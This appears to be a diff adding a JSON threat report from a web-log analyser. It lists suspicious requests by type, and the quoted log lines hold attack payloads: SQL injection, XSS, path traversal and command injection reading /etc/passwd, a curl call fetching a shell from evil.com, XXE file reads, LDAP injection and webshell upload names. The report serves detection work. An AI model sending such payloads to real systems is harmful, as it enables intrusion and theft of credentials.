@@ -1,0 +1,226 @@
+{
+  "summary": {
+    "total_lines": 47,
+    "suspicious_count": 31,
+    "timestamp": null
+  },
+  "threats": [
+    {
+      "type": "SQL_INJECTION",
+      "severity": "CRITICAL",
+      "ip": "10.0.0.23",
+      "score": 100,
+      "line": "10.0.0.23 - - [12/Dec/2025:10:18:44 +0300] \"GET /product.php?id=1 UNION SELECT username,password FROM users HTTP/1.1\" 500 1024"
+    },
+    {
+      "type": "XSS",
+      "severity": "HIGH",
+      "ip": "203.0.113.45",
+      "score": 80,
+      "line": "203.0.113.45 - - [12/Dec/2025:10:20:10 +0300] \"GET /search.php?q=<script>alert(1)</script> HTTP/1.1\" 200 845"
+    },
+    {
+      "type": "PATH_TRAVERSAL",
+      "severity": "HIGH",
+      "ip": "172.16.0.7",
+      "score": 90,
+      "line": "172.16.0.7 - - [12/Dec/2025:10:22:55 +0300] \"GET /../../../../etc/passwd HTTP/1.1\" 403 312"
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "severity": "CRITICAL",
+      "ip": "45.33.32.156",
+      "score": 100,
+      "line": "45.33.32.156 - - [12/Dec/2025:10:25:10 +0300] \"GET /exec.php?cmd=ping 8.8.8.8; cat /etc/passwd HTTP/1.1\" 500 1024"
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "severity": "CRITICAL",
+      "ip": "45.33.32.156",
+      "score": 100,
+      "line": "45.33.32.156 - - [12/Dec/2025:10:25:15 +0300] \"GET /run.php?input=test | whoami HTTP/1.1\" 200 512"
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "severity": "CRITICAL",
+      "ip": "104.20.10.50",
+      "score": 100,
+      "line": "104.20.10.50 - - [12/Dec/2025:10:25:20 +0300] \"GET /api.php?cmd=$(curl http://evil.com/shell.sh) HTTP/1.1\" 500 812"
+    },
+    {
+      "type": "XXE",
+      "severity": "CRITICAL",
+      "ip": "66.42.58.99",
+      "score": 95,
+      "line": "66.42.58.99 - - [12/Dec/2025:10:30:05 +0300] \"POST /upload.xml HTTP/1.1\" 200 1024 \"<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">\""
+    },
+    {
+      "type": "XXE",
+      "severity": "CRITICAL",
+      "ip": "66.42.58.99",
+      "score": 95,
+      "line": "66.42.58.99 - - [12/Dec/2025:10:30:10 +0300] \"POST /parse.php HTTP/1.1\" 200 512 \"<!DOCTYPE foo [<!ELEMENT foo ANY>]>\""
+    },
+    {
+      "type": "XXE",
+      "severity": "CRITICAL",
+      "ip": "185.220.101.5",
+      "score": 95,
+      "line": "185.220.101.5 - - [12/Dec/2025:10:30:15 +0300] \"GET /read.php?file=php://filter/resource=config.php HTTP/1.1\" 200 2048"
+    },
+    {
+      "type": "LDAP_INJECTION",
+      "severity": "HIGH",
+      "ip": "198.51.100.99",
+      "score": 85,
+      "line": "198.51.100.99 - - [12/Dec/2025:10:35:01 +0300] \"POST /login.php HTTP/1.1\" 200 512 \"username=*)(uid=*\""
+    },
+    {
+      "type": "LDAP_INJECTION",
+      "severity": "HIGH",
+      "ip": "198.51.100.99",
+      "score": 85,
+      "line": "198.51.100.99 - - [12/Dec/2025:10:35:05 +0300] \"GET /search.php?filter=admin)(|(cn=* HTTP/1.1\" 200 1024"
+    },
+    {
+      "type": "MALICIOUS_UPLOAD",
+      "severity": "HIGH",
+      "ip": "89.248.167.131",
+      "score": 85,
+      "line": "89.248.167.131 - - [12/Dec/2025:10:40:01 +0300] \"POST /upload.php?file=shell.php HTTP/1.1\" 200 512"
+    },
+    {
+      "type": "MALICIOUS_UPLOAD",
+      "severity": "HIGH",
+      "ip": "89.248.167.131",
+      "score": 85,
+      "line": "89.248.167.131 - - [12/Dec/2025:10:40:05 +0300] \"POST /upload.php?file=webshell.aspx HTTP/1.1\" 200 512"
+    },
+    {
+      "type": "MALICIOUS_UPLOAD",
+      "severity": "HIGH",
+      "ip": "151.80.31.103",
+      "score": 85,
+      "line": "151.80.31.103 - - [12/Dec/2025:10:40:10 +0300] \"POST /upload.php?file=backdoor.jsp? HTTP/1.1\" 200 512"
+    },
+    {
+      "type": "MALICIOUS_UPLOAD",
+      "severity": "HIGH",
+      "ip": "151.80.31.103",
+      "score": 85,
+      "line": "151.80.31.103 - - [12/Dec/2025:10:40:15 +0300] \"POST /upload.php?file=image.jpg%00.php HTTP/1.1\" 200 512"
+    },
+    {
+      "type": "DIRECTORY_LISTING",
+      "severity": "MEDIUM",
+      "ip": "77.72.82.20",
+      "score": 60,
+      "line": "77.72.82.20 - - [12/Dec/2025:10:45:01 +0300] \"GET /backup/ HTTP/1.1\" 200 4096 \"<title>Index of /backup</title>\""
+    },
+    {
+      "type": "DIRECTORY_LISTING",
+      "severity": "MEDIUM",
+      "ip": "77.72.82.20",
+      "score": 60,
+      "line": "77.72.82.20 - - [12/Dec/2025:10:45:05 +0300] \"GET /uploads/ HTTP/1.1\" 200 2048 \"Directory listing for /uploads/\""
+    },
+    {
+      "type": "SUSPICIOUS_AGENT",
+      "severity": "MEDIUM",
+      "ip": "123.45.67.89",
+      "score": 70,
+      "line": "123.45.67.89 - - [12/Dec/2025:10:50:01 +0300] \"GET /admin/ HTTP/1.1\" 404 512 \"-\" \"sqlmap/1.5.2\""
+    },
+    {
+      "type": "SUSPICIOUS_AGENT",
+      "severity": "MEDIUM",
+      "ip": "123.45.67.89",
+      "score": 70,
+      "line": "123.45.67.89 - - [12/Dec/2025:10:50:05 +0300] \"GET /wp-admin/ HTTP/1.1\" 404 512 \"-\" \"Nikto/2.1.6\""
+    },
+    {
+      "type": "SUSPICIOUS_AGENT",
+      "severity": "MEDIUM",
+      "ip": "180.76.15.143",
+      "score": 70,
+      "line": "180.76.15.143 - - [12/Dec/2025:10:50:10 +0300] \"GET / HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine)\""
+    },
+    {
+      "type": "SQL_INJECTION",
+      "severity": "CRITICAL",
+      "ip": "10.0.0.23",
+      "score": 100,
+      "line": "10.0.0.23 - - [12/Dec/2025:10:18:44 +0300] \"GET /product.php?id=1 UNION SELECT username,password FROM users HTTP/1.1\" 500 1024"
+    },
+    {
+      "type": "XSS",
+      "severity": "HIGH",
+      "ip": "203.0.113.45",
+      "score": 80,
+      "line": "203.0.113.45 - - [12/Dec/2025:10:20:10 +0300] \"GET /search.php?q=<script>alert(1)</script> HTTP/1.1\" 200 845"
+    },
+    {
+      "type": "PATH_TRAVERSAL",
+      "severity": "HIGH",
+      "ip": "172.16.0.7",
+      "score": 90,
+      "line": "172.16.0.7 - - [12/Dec/2025:10:22:55 +0300] \"GET /../../../../etc/passwd HTTP/1.1\" 403 312"
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "severity": "CRITICAL",
+      "ip": "45.33.32.156",
+      "score": 100,
+      "line": "45.33.32.156 - - [12/Dec/2025:10:25:10 +0300] \"GET /exec.php?cmd=ping 8.8.8.8; cat /etc/passwd HTTP/1.1\" 500 1024"
+    },
+    {
+      "type": "XXE",
+      "severity": "CRITICAL",
+      "ip": "66.42.58.99",
+      "score": 95,
+      "line": "66.42.58.99 - - [12/Dec/2025:10:30:05 +0300] \"POST /upload.xml HTTP/1.1\" 200 1024 <!ENTITY xxe SYSTEM\""
+    },
+    {
+      "type": "LDAP_INJECTION",
+      "severity": "HIGH",
+      "ip": "198.51.100.99",
+      "score": 85,
+      "line": "198.51.100.99 - - [12/Dec/2025:10:35:01 +0300] \"POST /login.php HTTP/1.1\" 200 512 username=*)(uid=*"
+    },
+    {
+      "type": "MALICIOUS_UPLOAD",
+      "severity": "HIGH",
+      "ip": "89.248.167.131",
+      "score": 85,
+      "line": "89.248.167.131 - - [12/Dec/2025:10:40:01 +0300] \"POST /upload.php?file=shell.php HTTP/1.1\" 200 512"
+    },
+    {
+      "type": "DIRECTORY_LISTING",
+      "severity": "MEDIUM",
+      "ip": "77.72.82.20",
+      "score": 60,
+      "line": "77.72.82.20 - - [12/Dec/2025:10:45:01 +0300] \"GET /backup/ HTTP/1.1\" 200 4096 Index of /backup"
+    },
+    {
+      "type": "SUSPICIOUS_AGENT",
+      "severity": "MEDIUM",
+      "ip": "123.45.67.89",
+      "score": 70,
+      "line": "123.45.67.89 - - [12/Dec/2025:10:50:01 +0300] \"GET /admin/ HTTP/1.1\" 404 512 \"-\" \"sqlmap/1.5.2\""
+    },
+    {
+      "type": "SSH_BRUTE_FORCE",
+      "severity": "HIGH",
+      "ip": "198.51.100.77",
+      "score": 120,
+      "line": "6 failed SSH logins within 60s"
+    },
+    {
+      "type": "WEB_BRUTE_FORCE",
+      "severity": "MEDIUM",
+      "ip": "192.168.1.15",
+      "score": 90,
+      "line": "6 failed login attempts"
+    }
+  ]
+}
